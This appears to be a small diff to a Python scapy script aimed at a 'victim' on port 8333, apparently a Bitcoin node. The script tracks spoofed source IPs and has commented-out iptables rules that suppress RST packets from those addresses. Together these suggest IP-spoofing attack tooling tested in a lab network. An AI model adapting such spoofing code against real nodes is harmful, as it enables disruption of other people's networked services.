@@ -6,7 +6,7 @@ from scapy.all import *
 #from impacket import ImpactDecoder, ImpactPacket
 
 victim_ip = '10.0.2.5'
-victim_port = 833
+victim_port = 8333
 attacker_port = 12345
 
 pending_spoof_IPs = []
@@ -80,8 +80,8 @@ def initialize_connection(victim_ip):
 	# Remove all entries
 	#sudo iptables -F
 
-	#terminal(f'iptables -t raw -A PREROUTING -p tcp --dport {attacker_port} -j DROP')
-	#terminal(f'iptables -t raw -A PREROUTING -p tcp --dport {victim_port} -j DROP')
+	#terminal(f'iptables -t raw -A PREROUTING -p tcp -d {spoof_ip} -j DROP')
+	#terminal(f'iptables -t raw -A PREROUTING -p tcp --sport {victim_port} -j DROP')
 
 	#terminal(f'iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {spoof_ip} -j DROP')
 	#terminal(f'iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {spoof_ip} -d {victim_ip} -dport {victim_port} -j DROP')
